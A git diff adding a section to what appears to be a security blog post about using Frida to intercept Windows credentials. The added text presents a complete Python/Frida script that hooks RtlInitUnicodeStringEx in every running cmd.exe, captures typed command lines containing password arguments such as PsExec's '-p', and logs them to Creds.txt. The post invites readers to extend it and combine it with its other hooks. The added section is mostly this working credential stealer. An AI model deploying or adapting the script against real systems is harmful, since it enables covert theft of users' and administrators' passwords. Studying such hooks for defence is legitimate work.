@@ -367,6 +367,115 @@ Last but not least, PsExec - the great remoting tool from the sysinternals suite
 
  ![](C:\Users\ilanka\Documents\GitHub\IlanKalendarov.github.io\Images\PsExecResukt.png)
 
-`WNetAddConnection2W` is the function that contains our secret password. If we'll try to implement this we'll run into a problem, Frida won't have time to attach to the `PsExec.exe` process because we are giving the password as a argument, Let's try it: 
+`WNetAddConnection2W` is the function that contains our secret password. If we'll try to implement this we'll run into a problem, Frida won't have time to attach to the `PsExec.exe` process because we are giving the password as an argument, Let's try it: 
 
 ![](C:\Users\ilanka\Documents\GitHub\IlanKalendarov.github.io\Images\PSEXECerror.png)
+
+The script was not fast enough to catch the credentials we need to find a different way. Looking at this I thought to myself, what if we hook everything that was entered inside the command prompt? Let's explore. This time I'll try to monitor the command prompt and check for our secret password:
+
+![](C:\Users\ilanka\Documents\GitHub\IlanKalendarov.github.io\Images\CmdExplore.png)
+
+We can see there is a new thread under, searching for our password resulted in the `RtlInitUnicodeStringEx` function from `Ntdll.dll`. unfortunately, there are no docs available at Microsoft like most of the Ntdll library. But we can see the arguments that the function takes. The second argument - `SourceString` looks interesting, We also can see that the function is used **a lot** of times, basically every time the user gives input to the command prompt, So we need to build a filter mechanism in order to filter unwanted garbage.
+
+Final script should look like this:
+
+```python
+# Wrriten by Ilan Kalendarov
+
+from __future__ import print_function
+import frida
+from time import sleep
+import psutil
+from threading import Lock, Thread
+import sys
+
+# Locking the cmd thread to prevent other threads
+#interfering with our current session
+lockCmd = Lock()
+
+def on_message_cmd(message, data):
+	# Executes when the user enters the right keyword from the array above.
+	# Then, open the txt file and append it
+
+	#filter the wanted args
+	arr = ["-p", "pass", "password"]
+	if any(name for name in arr if name in message['payload']):
+		print(message['payload'])
+		with open("Creds.txt", "a") as f:
+			f.write(message['payload'] + '\n')
+		try:
+			lockCmd.release()
+			print("[+] released")
+		except Exception:
+			pass
+
+
+def WaitForCmd():
+	numOfCmd = []
+	while True:
+		#  Trying to find if cmd is running if so, execute the "CMD" function.
+		if ("cmd.exe" in (p.name() for p in psutil.process_iter())):
+			process = filter(lambda p: p.name() == "cmd.exe", psutil.process_iter())
+			for i in process:
+				# if we alredy hooked the cmd window,pass
+				if (i.pid not in numOfCmd):
+					#IF a new cmd window pops add it to the array, we want to hook
+					#evey cmd window
+					numOfCmd.append(i.pid)
+					lockCmd.acquire()
+					print("[+] Found cmd")
+					Cmd(i.pid)
+					lockCmd.release()
+					sleep(0.5)
+
+		# if cmd is dead release the lock
+		elif (not "cmd.exe" in (p.name() for p in psutil.process_iter())) and lockCmd.locked():
+			lockCmd.release()
+			print("[+] cmd is dead releasing lock")
+		else:
+			pass
+		sleep(0.5)
+
+def Cmd(Cmdpid):
+	try:
+		# attaching to the cmd window, this time with the right pid
+		print("[+] Trying To Attach To cmd")
+		session = frida.attach(Cmdpid)
+		print("[+] Attached cmd with pid {}!".format(Cmdpid))
+		script = session.create_script("""
+			var username;
+			var password;
+			var CredUnPackAuthenticationBufferW = Module.findExportByName("Ntdll.dll", "RtlInitUnicodeStringEx")			
+			Interceptor.attach(CredUnPackAuthenticationBufferW, {
+				onEnter: function (args) 
+				{
+					password = args[1];
+				},
+				onLeave: function (result)
+				{
+					// Credentials are now decrypted
+					var pass = password.readUtf16String();
+			
+					if (pass)
+					{
+						send("\\n+ Intercepted cmd Creds\\n" + ":" + pass);
+					}
+				}
+			});
+
+		""")
+		script.on('message', on_message_cmd)
+		script.load()
+	except Exception as e:
+		print(str(e))
+
+if __name__ == "__main__":
+	thread = Thread(target=WaitForCmd)
+	thread.start()
+```
+
+The result would be:
+
+![](C:\Users\ilanka\Documents\GitHub\IlanKalendarov.github.io\Images\cmdResukt.png)
+
+Great! we were able to intercept the credentials, You can expend the script to your personal needs or even combine all of them together, I'll leave it for you to explore ;).  
